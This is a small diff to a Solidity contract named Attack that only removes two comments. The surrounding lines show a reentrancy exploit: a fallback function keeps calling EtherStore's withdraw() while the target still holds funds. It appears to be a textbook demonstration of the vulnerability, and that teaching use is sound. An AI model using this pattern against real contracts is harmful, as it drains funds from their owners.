@@ -11,7 +11,6 @@ contract Attack {
         etherStore = EtherStore(_etherStoreAddress);
     }
 
-    // Fallback is called when EtherStore sends Ether to this contract.
     fallback() external payable {
         if (address(etherStore).balance >= 1 ether) {
             etherStore.withdraw();
@@ -24,7 +23,6 @@ contract Attack {
         etherStore.withdraw();
     }
 
-    // Helper function to check the balance of this contract
     function getBalance() public view returns (uint) {
         return address(this).balance;
     }
